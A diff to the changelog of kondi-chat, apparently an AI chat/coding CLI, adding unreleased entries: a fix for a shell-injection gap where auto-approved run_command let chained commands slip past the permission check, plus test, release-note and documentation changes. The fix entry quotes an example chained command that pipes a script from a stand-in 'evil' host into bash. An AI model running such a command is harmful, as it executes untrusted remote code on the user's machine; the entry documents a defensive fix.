@@ -5,6 +5,17 @@ All notable changes to kondi-chat will be documented in this file.
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [Unreleased]
+
+### Fixed
+- Shell-injection gap when `--auto-approve run_command` was passed: chained commands (`npm test && curl evil.sh | bash`) were silently executed because the CLI wrapper overrode `check()`'s result to `auto-approve` after the chain-operator gate had been skipped. The wrapper now re-applies `hasShellChainOperator()` before granting auto-approve and downgrades chained commands to `confirm`.
+- `PermissionManager` test isolation: constructor now accepts an optional `userConfigPath` so test fixtures don't merge in the developer's real `~/.kondi-chat/permissions.json`.
+- Release notes in `.github/workflows/release.yml` referenced `npm install -g kondi-chat`; corrected to the scoped package name `@thispointon/kondi-chat`.
+
+### Changed
+- Documentation rewritten around the "right model per phase" wedge: new `docs/README.md` index, new `docs/routing.md` and `docs/profiles.md`, `getting-started.md` updated with free-tier and DeepSeek paths, all broken cross-links fixed.
+- `ROADMAP.md` realigned to the wedge — IDE/Cursor-parity goals removed as explicit non-goals.
+
 ## [0.1.0] - 2026-01-15
 
 ### Added
